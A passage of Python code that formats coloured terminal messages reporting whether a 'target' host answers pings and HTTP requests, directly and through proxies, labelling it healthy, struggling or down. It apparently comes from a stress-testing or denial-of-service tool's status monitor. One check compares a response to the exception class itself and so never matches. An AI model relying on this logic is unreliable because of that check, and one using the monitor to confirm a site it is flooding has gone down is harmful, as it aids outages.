            message += f" through proxies ({r.packet_loss * 100:.0f}% packet loss)."
            message += ansi_wrap(f" Target may be down.", color="red")
    else:
        message += f"Checking if the target is reachable{CyclicPeriods()}"

    return message


def craft_layer_7_outreach_summary_string(l7_response: Union[Response, RequestException],
                                          l7_proxied_responses: List[Union[Response, RequestException]]) -> str:
    message = "Target "

    # some helper functions
    def is_healthy(response: Union[Response, RequestException]) -> bool:
        if isinstance(response, Response):
            return response.status_code < 500
        return False

    def is_down(response: Union[Response, RequestException]) -> bool:
        if isinstance(response, Response):
            return response.status_code >= 500
        return False

    def is_indeterminate(response: Union[Response, RequestException]) -> bool:
        return response is RequestException

    if isinstance(l7_response, Response):
        if is_healthy(l7_response):
            message += "is "
            message += ansi_wrap(f"HEALTHY", color="green")
            message += f" (response code {l7_response.status_code} = {l7_response.reason})."
        elif is_down(l7_response):
            message += "may be "
            message += ansi_wrap(f"DOWN", color="red")
            message += f" (response code {l7_response.status_code} = {l7_response.reason})."
        else:
            message += "state cannot be determined."
    elif isinstance(l7_response, RequestException):
        exception: RequestException = l7_response
        message += "may be "
        message += ansi_wrap(f"DOWN", color="red")
        message += f" ({type(exception).__name__} when making a request)."
    elif l7_proxied_responses is not None and len(l7_proxied_responses) > 0:
        n_proxies = len(l7_proxied_responses)
        n_healthy = len([r for r in l7_proxied_responses if is_healthy(r)])
        n_down = len([r for r in l7_proxied_responses if is_down(r)])
        n_indeterminate = len([r for r in l7_proxied_responses if is_indeterminate(r)])

        if n_healthy > 0 and n_down == 0 and n_indeterminate == 0:
            message += "is "
            message += ansi_wrap(f"HEALTHY", color="green")
            if n_proxies > 1:
                message += f" (got healthy responses through all {n_proxies} proxies)."
            else:
                message += f" (got healthy response through the proxy)."
        elif n_healthy > 0 and (n_down > 0 or n_indeterminate > 0):
            message += "is "
            message += ansi_wrap(f"STRUGGLING", color="yellow")
            message += f" (got healthy responses only through {n_healthy}/{n_proxies} proxies)."
        elif n_healthy == 0 and n_down > 0:
            message += "may be "
            message += ansi_wrap(f"DOWN", color="red")
            if n_proxies > 1:
                message += f" (got bad or no responses through all of the {n_proxies} proxies)."
            else:
                if n_down == 1:
                    message += f" (got bad response through the proxy)."
                else:
                    message += f" (got no response through the proxy)."
        else:
            if n_proxies > 1:
                message += "is in limbo. State could not be determined through any of the proxies."
            else:
                message += "is in limbo. State could not be determined through the proxy."
    else:
        message += "did not respond. It may be "
        message += ansi_wrap("down", color="red")
        message += f", or it does not support HTTP protocol."

    return message


def craft_detailed_outreach_stats_string(l4: Host,
                                         l7: Union[Response, RequestException]):
    message = ""

    # is alive
    if l4.is_alive:
        s = ansi_wrap("●", color="green")
    else:
        s = ansi_wrap("●", color="red")
    message += f"{s:>1} "

    # average ping
    padding = 7
    if l4.is_alive:
        s = ansi_wrap(f"{l4.avg_rtt:.0f} ms".ljust(padding), color="green")
    else:
        s = ansi_wrap(f"{CyclicPeriods()}".ljust(padding), color="red")
    message += f"{s} - "

    # response / exception
    padding = 0
    if isinstance(l7, Response):
        if l7.status_code < 400:
            color = "green"
        elif l7.status_code < 500:
            color = "yellow"
        else:
            color = "red"
        s = ansi_wrap(f"{l7.status_code} {l7.reason}".ljust(padding), color=color)
    elif isinstance(l7, RequestException):
        s = f"{type(l7).__name__}"
        s = ansi_wrap(s.ljust(padding), color="red")
    else:
        s = ansi_wrap(f"{CyclicPeriods()}".ljust(padding), color="red")
    message += f"{s}"

    return message


if __name__ == '__main__':
    start()
